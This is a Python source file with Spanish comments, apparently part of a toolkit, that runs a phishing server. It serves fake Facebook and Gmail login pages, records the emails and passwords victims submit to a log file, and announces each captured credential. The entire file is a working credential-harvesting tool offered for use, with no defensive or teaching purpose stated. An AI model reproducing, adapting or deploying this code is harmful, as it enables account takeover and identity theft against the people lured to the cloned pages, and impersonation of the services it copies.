#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Módulo de generación de páginas de phishing clonadas.
Uso: python phish.py -s facebook -p 8080
"""

import sys
import os
import argparse
import http.server
import socketserver
import threading
import webbrowser
import json
import time
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.colors import Colors
from core.logger import Logger
from core.utils import Utils

class PhishHandler(http.server.SimpleHTTPRequestHandler):
    """Manejador HTTP personalizado para phishing."""

    def __init__(self, *args, **kwargs):
        self.templates_dir = kwargs.pop('templates_dir', 'templates')
        self.logger = kwargs.pop('logger', Logger())
        super().__init__(*args, **kwargs)

    def do_GET(self):
        """Maneja solicitudes GET."""
        if self.path == '/':
            self.serve_phishing_page()
        else:
            super().do_GET()

    def do_POST(self):
        """Maneja solicitudes POST (captura de credenciales)."""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Registrar credenciales
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] Datos recibidos: {post_data}\n"

        log_file = os.path.join(os.path.dirname(__file__), '..', 'phish_logs.txt')
        with open(log_file, 'a') as f:
            f.write(log_entry)

        print(f"{Colors.GREEN}[+] CREDENCIALES CAPTURADAS: {post_data}{Colors.RESET}")

        # Redirigir a página de éxito (o error)
        self.send_response(302)
        self.send_header('Location', '/success.html')
        self.end_headers()

    def serve_phishing_page(self):
        """Sirve la página de phishing."""
        template_path = os.path.join(self.templates_dir, 'facebook.html')
        if os.path.exists(template_path):
            with open(template_path, 'r') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(content.encode())
        else:
            # Página de phishing básica
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Iniciar Sesión</title>
                <style>
                    body { font-family: Arial; max-width: 400px; margin: 100px auto; }
                    input { width: 100%; padding: 10px; margin: 10px 0; }
                    button { background: #1877f2; color: white; padding: 10px; border: none; width: 100%; }
                </style>
            </head>
            <body>
                <h2>Iniciar Sesión</h2>
                <form method="POST" action="/">
                    <input type="text" name="email" placeholder="Email o teléfono" required>
                    <input type="password" name="password" placeholder="Contraseña" required>
                    <button type="submit">Iniciar Sesión</button>
                </form>
            </body>
            </html>
            """
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())

class PhishServer:
    """Servidor HTTP embebido para phishing."""

    def __init__(self, site='facebook', port=8080, verbose=False):
        self.site = site
        self.port = port
        self.verbose = verbose
        self.logger = Logger()
        self.utils = Utils()
        self.server = None
        self.templates_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')

    def start(self):
        """Inicia el servidor HTTP."""
        # Crear directorio de templates si no existe
        if not os.path.exists(self.templates_dir):
            os.makedirs(self.templates_dir)

        # Crear plantilla si no existe
        self.create_template()

        try:
            handler = lambda *args, **kwargs: PhishHandler(*args, templates_dir=self.templates_dir, logger=self.logger, **kwargs)
            self.server = socketserver.TCPServer(("", self.port), handler)
            print(f"\n{Colors.GREEN}╔════════════════════════════════════════════╗{Colors.RESET}")
            print(f"{Colors.GREEN}║      SERVIDOR DE PHISHING ACTIVO         ║{Colors.RESET}")
            print(f"{Colors.GREEN}╚════════════════════════════════════════════╝{Colors.RESET}")
            print(f"\n{Colors.CYAN}[+] Sitio: {self.site}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] Puerto: {self.port}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] URL: http://localhost:{self.port}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] IP Local: http://{self.utils.get_local_ip()}:{self.port}{Colors.RESET}")
            print(f"\n{Colors.YELLOW}[*] Esperando credenciales... (Ctrl+C para detener){Colors.RESET}")

            # Abrir navegador
            webbrowser.open(f"http://localhost:{self.port}")

            self.server.serve_forever()

        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Servidor detenido.{Colors.RESET}")
            self.stop()
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
            self.stop()

    def create_template(self):
        """Crea plantilla HTML para el sitio seleccionado."""
        template_path = os.path.join(self.templates_dir, f"{self.site}.html")

        if os.path.exists(template_path):
            return

        # Plantillas básicas
        templates = {
            'facebook': """
            <!DOCTYPE html>
            <html>
            <head><title>Facebook - Iniciar Sesión</title></head>
            <body>
                <div style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ddd;border-radius:8px;">
                    <h2 style="color:#1877f2;">Facebook</h2>
                    <form method="POST" action="/">
                        <input type="text" name="email" placeholder="Correo electrónico o teléfono" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:4px;" required>
                        <input type="password" name="password" placeholder="Contraseña" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:4px;" required>
                        <button type="submit" style="width:100%;padding:10px;background:#1877f2;color:white;border:none;border-radius:4px;font-size:16px;">Iniciar Sesión</button>
                    </form>
                </div>
            </body>
            </html>
            """,
            'gmail': """
            <!DOCTYPE html>
            <html>
            <head><title>Gmail - Iniciar Sesión</title></head>
            <body>
                <div style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ddd;border-radius:8px;">
                    <h2 style="color:#1a73e8;">Gmail</h2>
                    <form method="POST" action="/">
                        <input type="email" name="email" placeholder="Correo electrónico" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:4px;" required>
                        <input type="password" name="password" placeholder="Contraseña" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:4px;" required>
                        <button type="submit" style="width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;">Iniciar Sesión</button>
                    </form>
                </div>
            </body>
            </html>
            """
        }

        if self.site in templates:
            with open(template_path, 'w') as f:
                f.write(templates[self.site])

    def stop(self):
        """Detiene el servidor."""
        if self.server:
            self.server.shutdown()

def main(args):
    """Función principal llamada por snek.py"""
    parser = argparse.ArgumentParser(description="Generador de páginas de phishing clonadas")
    parser.add_argument('-s', '--site', default='facebook', 
                       choices=['facebook', 'gmail'], help="Sitio a clonar (default: facebook)")
    parser.add_argument('-p', '--port', type=int, default=8080, help="Puerto del servidor (default: 8080)")
    parser.add_argument('-v', '--verbose', action='store_true', help="Modo verboso")

    if not args:
        parser.print_help()
        return

    try:
        parsed_args = parser.parse_args(args)
    except SystemExit:
        return

    # Iniciar servidor
    server = PhishServer(
        site=parsed_args.site,
        port=parsed_args.port,
        verbose=parsed_args.verbose
    )
    server.start()

if __name__ == "__main__":
    main(sys.argv[1:])
